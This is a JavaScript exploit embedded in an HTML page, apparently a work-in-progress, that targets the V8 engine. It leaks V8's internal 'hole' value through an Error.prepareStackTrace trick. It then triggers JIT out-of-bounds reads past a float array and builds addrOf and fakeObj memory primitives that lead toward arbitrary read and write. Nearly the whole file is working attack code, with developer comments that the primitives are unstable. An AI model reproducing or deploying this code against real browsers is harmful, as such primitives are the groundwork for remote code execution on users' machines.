<pre id="log"></pre>

<script>
function print(_log) {
  console.log(`${_log}`)
  document.getElementById("log").innerHTML += `${_log}<br/>`
}


function gc_minor() {
  for (let i = 0; i < 1000; i++) {
    new ArrayBuffer(0x10000);
  }
}

function gc_major() {
  new ArrayBuffer(0x7fe00000);
}

var buf = new ArrayBuffer(16);
var float64 = new Float64Array(buf);
var bigUint64 = new BigUint64Array(buf);
var uint32 = new Uint32Array(buf);

function f2i(f) {
  float64[0] = f;
  return bigUint64[0];
}

function i2f(i) {
  bigUint64[0] = i;
  return float64[0];
}

function i322f(l, u) {
  uint32[0] = l;
  uint32[1] = u;
  return float64[0];
}

Number.prototype.toBigInt = function toBigInt() {
  float64[0] = this;
  return bigUint64[0];
};

BigInt.prototype.toNumber = function toNumber() {
  bigUint64[0] = this;
  return float64[0];
};

function hex(i) {
  return i.toString(16).padStart(16, "0");
}

// =================== //
//     Start here!     //
// =================== //

var h0le = [0];
function leak_hole() {
  function rGlobal() {
      h0le[0] = stack;
  }
  Error.captureStackTrace(globalThis);
  Error.prepareStackTrace = function() {
    Reflect.deleteProperty(Error, 'prepareStackTrace');
    Reflect.deleteProperty(globalThis, 'stack');
    Reflect.defineProperty(
      globalThis, 
      'stack',
      {configurable: false, writable: true, enumerable: true, value: 1}
	  );
    stack = undefined;
    for (let i = 0; i < 100000; i++) {
      rGlobal();
    }
    return undefined;
  };
  Reflect.defineProperty(
	  globalThis, 
	  'stack',
	  {configurable: true, writable: true, enumerable: true, value: undefined}
  );
  delete globalThis.stack;
  rGlobal();
  return h0le[0];
}

const the = {  hole: leak_hole()  };

let f_arr;   // must be let, cannot be const or var damn stupid
let o_arr;
let oobReadValue;
let oobAddrOfValue;
let oobFakeObjValue;

function createOobReadOneQword8bytesAfterTheLastIndexOfFloatArray() {
  function oob(bool, counter) {
    let hole = the.hole;
    let idx = (Number(bool ? hole : -1) | 0) + 1; // idx will be -0x7fffffff when we JIT this shit
    f_arr = [1.1];
    o_arr = [{}];
    oobReadValue = f2i(f_arr.at(idx * 1)); // can only read one time
  }
  for (var i = 0; i < 0x10000; i++) {
    oob(true, i);
  }
  print(`[+] Reading... ${oobReadValue.toString(16)}`)
}

function createOobReadOneQword16bytesAfterTheLastIndexOfFloatArray() {
  function oob(bool, counter) {
    let hole = the.hole;
    let idx = (Number(bool ? hole : -1) | 0) + 1; // idx will be -0x7fffffff when we JIT this shit
    f_arr = [1.1];
    o_arr = [{}];
    oobReadValue = f2i(f_arr.at(idx * 2)); // can only read one time
  }
  for (var i = 0; i < 0x10000; i++) {
    oob(true, i);
  }
  // you cannot even put %DebugPrint() here cause it will deoptimise
  print(`[+] Reading... ${oobReadValue.toString(16)}`)
}

// very stupid but it is what it is
// createOobReadOneQword8bytesAfterTheLastIndexOfFloatArray()
// createOobReadOneQword16bytesAfterTheLastIndexOfFloatArray()

// o = {}
// f_arr = [1.1];
// o_arr = [o];
// %DebugPrint(f_arr);
// %DebugPrint(o_arr);
// %DebugPrint(o);
// alert()

function addrOfWrapper(_object) {
  function addressOf(bool, counter, _inner_object) {
    let hole = the.hole;
    let idx = (Number(bool ? hole : -1) | 0) + 1;
    f_arr = [1.1];
    o_arr = [_inner_object];
    oobAddrOfValue = f2i(f_arr.at(idx * 4));
    return oobAddrOfValue
  }
  for (var i = 0; i < 0x10000; i++) {
    addressOf(true, i, {}); // put some dummy shit
  }
  //%DebugPrint(_object);
  return addressOf(true, i, _object) & 0xffffffffn;
}

// let test2 = []
// print(`[?] ${addrOfWrapper(test2).toString(16)}`)

/////////////////////////////////////////////////////////////////////////
/////////////////////////////////////////////////////////////////////////
/////////////////////////////////////////////////////////////////////////

// o = {}
// o_arr = [o];
// f_arr = [1.1];
// %DebugPrint(o_arr);
// %DebugPrint(f_arr);
// %DebugPrint(o);
// alert()

function fakeObjWrapper(_number) {
  function fakeObj(bool, counter, _inner_float) {
    let hole = the.hole;
    let idx = (Number(bool ? hole : -1) | 0) + 1;
    o_arr = [{}];
    f_arr = [_inner_float];
    oobFakeObjValue = o_arr.at(idx * 7);
    return oobFakeObjValue
  }
  for (var i = 0; i < 0x10000; i++) {
    fakeObj(true, i, 1.1); // put some dummy shit
  }
  // %DebugPrint(_object);
  return fakeObj(true, i, i322f(_number, _number));
}

// let test = [];
// let testAddr = addrOfWrapper(test);
// %DebugPrint(testAddr.toString(16));
// let fake = fakeObjWrapper(Number(testAddr));
// %DebugPrint(fake);

let floatMapAndProperties = undefined;

function giveMeMaterialForV8ReadWriteViaFakeObj() {
  function oob(bool, counter) {
    let hole = the.hole;
    let idx = (Number(bool ? hole : -1) | 0) + 1; // idx will be -0x7fffffff when we JIT this shit
    f_arr = [1.1];
    o_arr = [{}];
    floatMapAndProperties = f2i(f_arr.at(idx * 1)); // can only read one time
  }
  for (var i = 0; i < 0x10000; i++) {
    oob(true, i);
  }
  // you cannot even put %DebugPrint() here cause it will deoptimise 
  print(`[+] Float Map and Properties... ${floatMapAndProperties.toString(16)}`)
}

giveMeMaterialForV8ReadWriteViaFakeObj()
giveMeMaterialForV8ReadWriteViaFakeObj()


// i cannot do it like this makes exploit and primitives very unstable
</script>